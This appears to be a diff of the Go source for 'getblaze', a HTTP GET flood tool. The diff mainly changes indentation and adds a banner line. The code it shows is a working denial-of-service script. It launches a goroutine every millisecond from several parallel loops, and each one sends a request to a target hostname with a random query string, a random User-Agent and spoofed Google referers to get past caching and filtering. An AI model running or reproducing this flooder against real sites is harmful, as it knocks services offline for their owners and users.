@@ -1,20 +1,20 @@
 package main
 
 import (
-    "net/http"
-    "time"
-    "log"
-    "os"
-    "sync"
-    "os/signal"
-    "syscall"
-    "math/rand"
-    "strconv"
-    "flag"
-    "github.com/buptmiao/parallel"
-    "strings"
-    "github.com/corpix/uarand"
-    "github.com/gookit/color"
+	"net/http"
+	"time"
+	"log"
+	"os"
+	"sync"
+	"os/signal"
+	"syscall"
+	"math/rand"
+	"strconv"
+	"flag"
+	"github.com/buptmiao/parallel"
+	"strings"
+	"github.com/corpix/uarand"
+	"github.com/gookit/color"
 )
 
 var (
@@ -28,10 +28,10 @@ var (
 		"https://www.google.cf/?q=",
 		"https://www.google.nl/?q=",
 	}
-    fncCount = NewCount()
-    hostname string
-    sleep time.Duration
-    timeout time.Duration
+	fncCount = NewCount()
+	hostname string
+	sleep time.Duration
+	timeout time.Duration
 	param_joiner string
 )
 
@@ -44,25 +44,25 @@ func buildblock(size int) (s string) {
 }
 
 type Count struct {
-    mx    *sync.Mutex
-    count int
+	mx    *sync.Mutex
+	count int
 }
 
 func NewCount() *Count {
-    return &Count{mx: new(sync.Mutex), count: 0}
+	return &Count{mx: new(sync.Mutex), count: 0}
 }
 
 func (c *Count) Incr() {
-    c.mx.Lock()
-    c.count++
-    c.mx.Unlock()
+	c.mx.Lock()
+	c.count++
+	c.mx.Unlock()
 }
 
 func (c *Count) Count() int {
-    c.mx.Lock()
-    count := c.count
-    c.mx.Unlock()
-    return count
+	c.mx.Lock()
+	count := c.count
+	c.mx.Unlock()
+	return count
 }
 
 func get() {
@@ -72,14 +72,14 @@ func get() {
 		param_joiner = "?"
 	}
 
-    c := http.Client{
-        Timeout: 3500 * time.Millisecond,
-    }
+	c := http.Client{
+		Timeout: 3500 * time.Millisecond,
+	}
 
-    req, err := http.NewRequest("GET", hostname + param_joiner + buildblock(rand.Intn(7) + 3) + "=" + buildblock(rand.Intn(7) + 3), nil)
-    if err != nil {
-        log.Fatal(err)
-    }
+	req, err := http.NewRequest("GET", hostname + param_joiner + buildblock(rand.Intn(7) + 3) + "=" + buildblock(rand.Intn(7) + 3), nil)
+	if err != nil {
+		log.Fatal(err)
+	}
 
 	req.Header.Set("User-Agent", uarand.GetRandom())
 	req.Header.Add("Pragma", "no-cache") // used in case https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Pragma
@@ -88,54 +88,49 @@ func get() {
 	req.Header.Set("Keep-Alive", strconv.Itoa(rand.Intn(10) + 100))
 	req.Header.Set("Connection", "keep-alive")
 
-    resp, err := c.Do(req)
+	resp, err := c.Do(req)
 
-    fncCount.Incr()
+	fncCount.Incr()
 
-    if os.IsTimeout(err) {
-        color.Red.Println("Timeout")
-    } else {
-        color.Green.Println("OK")
-    }
+	if os.IsTimeout(err) {
+		color.Red.Println("Timeout")
+	} else {
+		color.Green.Println("OK")
+	}
 
-    if err != nil {
-        return
-    }
+	if err != nil {
+		return
+	}
 
-    defer resp.Body.Close()
+	defer resp.Body.Close()
 }
 
 func loop() {
-    for {
-        go get()
-        time.Sleep(1 * time.Millisecond) // sleep before sending request again
-    }
+	for {
+		go get()
+		time.Sleep(1 * time.Millisecond) // sleep before sending request again
+	}
 }
 
 func main() {
+	color.Cyan.Println("getblaze - https://github.com/zer-far/getblaze")
 	flag.StringVar(&hostname, "hostname", "", "example: --hostname https://example.com")
 	flag.Parse()
-
 	if hostname == "" {
 		color.Red.Println("Missing hostname.")
 		color.Blue.Println("Example usage:\n\t ./getblaze --hostname https://example.com")
 		os.Exit(1)
 	}
-
 	color.Yellow.Println("Press control+c to stop")
 	time.Sleep(2 * time.Second)
-
-    start := time.Now()
-
-    c := make(chan os.Signal)
-    signal.Notify(c, os.Interrupt, syscall.SIGTERM)
-
-    go func() {
-        <-c
-        color.Blue.Println("\nAttempted to send", fncCount.Count(), "requests in", time.Since(start)) // output when control+c is pressed
-        os.Exit(1)
-    }()
-
+	start := time.Now()
+	c := make(chan os.Signal)
+	signal.Notify(c, os.Interrupt, syscall.SIGTERM)
+	go func() {
+		<-c
+		color.Blue.Println("\nAttempted to send", fncCount.Count(), "requests in", time.Since(start)) // print when control+c is pressed
+		os.Exit(1)
+	}()
 	p := parallel.NewParallel() // runs function in parallel
 	p.Register(loop)
 	p.Register(loop)
